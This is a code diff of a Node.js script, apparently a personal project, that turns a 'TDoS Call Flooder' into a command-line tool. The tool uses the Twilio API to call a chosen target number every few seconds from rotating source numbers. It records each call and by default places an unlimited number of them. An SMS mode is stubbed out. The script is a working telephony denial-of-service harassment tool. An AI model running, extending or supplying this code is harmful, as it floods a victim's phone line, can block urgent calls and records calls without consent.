@@ -6,60 +6,72 @@ Ethan Wessel continuing for own personal project
 */
 
 require('dotenv').config()
-let accountSid = process.env.TWILIO_ACCOUNT_SID; //Config Here
-let authToken = process.env.TWILIO_AUTH_TOKEN; //Config Here
-let twilioNumbers = process.env.TWILIO_NUMBERS; //Config Here
-let twimlUrl = process.env.TWILIO_TWIML; //Config Here
-let client = require('twilio')(accountSid, authToken);
-let readline = require('readline');
+const chalk = require('chalk')
+const { program } = require("commander");
 
-let numbers = twilioNumbers.split(",");
-let toNumber = '+86**********';
-let count = 1;
-
-const calltimeout = 3000;// call time out = 3s.
-
-const appName ='===TDoS Call Flooder===';
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
-let index = 0;
-const callPhone = ()=>{
-    client.calls.create({
-        url: twimlUrl,
-        to: toNumber,
-        from: numbers[index++],
-	record: true 
-    }, function(err, call) {
-        if(call){
-            console.log("SID: " + call.sid);
-	    console.log("Calling " + toNumber + " from " + numbers[index]);
-        } else{
-            console.log("ERROR: " + err);
-	}
-    });
-
-    if(index >= numbers.length){
-        index = 0;
-    }
+function commaSeparatedList(value, dummyPrevious) {
+    return value.split(',');
 }
 
-const launchCall = ()=>{
-    callPhone();
-    setInterval(callPhone,calltimeout);
-};
+program
+    .requiredOption('-t, --target <string>', 'target to call')
+    .requiredOption('-a, --action <string>', 'call or message', 'call')
+    .requiredOption('-n, --numbers <items>', 'numbers to use', commaSeparatedList)
+    .option('-i, --instances <string>', 'number of instances', 'unlimited')
+    .option('-d, --delay <string>', 'delay between calls/messages in seconds', '10')
+    .parse()
+const options = program.opts()
+console.log(options)
 
-// Entrance of Main
-console.log(appName);
-rl.question('Enter the target number to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
-    console.log(`Trying to call this number: ${answer}`);
-    toNumber = answer;
+if (options.action !== 'call' && options.action !== 'sms') {
+    console.log(chalk.red(`'${options.action}' is an Invalid Action, please select: 'call' or 'sms'`))
+    process.exit(0)
+}
 
-    rl.close();
+let maxCallCount = options.instances !== 'unlimited' ? parseInt(options.instances) : 'unlimited'
+let accountSid = process.env.TWILIO_ACCOUNT_SID; //Config Here
+let authToken = process.env.TWILIO_AUTH_TOKEN; //Config Here
+let twimlUrl = process.env.TWILIO_TWIML; //Config Here
+let client = require('twilio')(accountSid, authToken);
 
-    //launchCall();
-    callPhone();
-});
-  
+if (options.action === 'call') {
+    let numbers = options.numbers;
+
+    const calltimeout = 3000;// call time out = 3s.
+
+    let callCount = 0;
+    let index = 0;
+    const callPhone = () => {
+        if (typeof (maxCallCount) === 'number' && callCount >= maxCallCount) {
+            console.log(`Terminating, max call count reached: ${maxCallCount}`)
+            process.exit(0)
+        }
+        callCount += 1
+
+        client.calls.create({
+            url: twimlUrl,
+            to: options.target,
+            from: numbers[index++],
+            record: true
+        }, function (err, call) {
+            if (call) {
+                console.log("SID: " + call.sid);
+                console.log("Calling " + options.target + " from " + numbers[index]);
+            } else {
+                console.log("ERROR: " + err);
+            }
+        });
+        // loop through numbers
+        index += 1
+        index %= numbers.length
+    }
+
+    const launchCall = () => {
+        callPhone();
+        setInterval(callPhone, calltimeout);
+    };
+
+    launchCall()
+} else {
+
+}
